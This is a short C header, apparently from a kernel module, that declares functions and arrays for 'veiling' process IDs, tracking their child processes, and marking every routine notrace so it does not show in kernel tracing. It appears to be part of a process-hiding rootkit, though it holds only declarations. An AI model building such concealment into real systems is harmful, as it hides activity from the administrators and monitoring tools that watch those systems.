#ifndef UB_VEILED_PIDS_H
#define UB_VEILED_PIDS_H

#define UB_MAX_VEILED_PIDS 32
#define UB_MAX_OFFSPRING_PIDS (UB_MAX_VEILED_PIDS * 128)

extern int ub_veiled_pids[UB_MAX_VEILED_PIDS];
extern int ub_veiled_count;
extern u64 ub_veiled_start_times[UB_MAX_VEILED_PIDS];
extern int ub_offspring_pids[UB_MAX_OFFSPRING_PIDS];
extern int ub_offspring_count;
extern u64 ub_offspring_start_times[UB_MAX_OFFSPRING_PIDS];

notrace int ub_veiled_pid_count(void);
notrace int ub_offspring_pid_count(void);
notrace int ub_veiled_pids_snapshot(int *dst, int max_entries);
notrace int ub_offspring_pids_snapshot(int *dst, int max_entries);
notrace void ub_offspring_track(int pid);
notrace int ub_is_offspring(int pid);
notrace void ub_veil_pid(int pid);
notrace int ub_is_veiled(int pid);
notrace int ub_pid_is_thread(int tid);

#endif
